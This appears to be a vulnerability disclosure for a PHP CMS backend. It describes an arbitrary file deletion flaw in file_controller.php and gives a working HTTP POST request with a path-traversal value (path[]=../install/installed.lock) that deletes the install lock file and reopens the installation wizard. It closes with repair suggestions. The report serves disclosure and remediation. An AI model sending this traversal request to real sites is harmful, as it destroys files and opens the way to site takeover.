Vulnerability file: \protected\controller\backend\file_controller.php
It can be seen that the deleted file or directory is received through the path parameter, and is directly deleted without security filtering, so we can use this vulnerability to delete any file

Vulnerability to reproduce:
1. First log in to the background to get cookies。

2. Here I delete the installed.lock file to verify the existence of the vulnerability，construct the packet as follows:

  POST /index.php?m=backend&c=file&a=delete HTTP/1.1
  Host: www.xxx.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0

  Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
  Accept-Encoding: gzip, deflate

  Connection: close
  Upgrade-Insecure-Requests: 1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 32
  
  path[]=../install/installed.lock

3、Click Send Packet,you can see that the file was deleted successfully

4、It can be seen that when the installed.lock file exists, when visiting http://x.x.x/install, the page will directly jump to the front home page

Therefore, when we delete the installed.lock file and visit http://x.x.x/install again, we will come to the installation wizard page

Repair suggestion:
1. Filter ../ or ..\\ in the file variable
2. Limit the scope of deleted files or directories
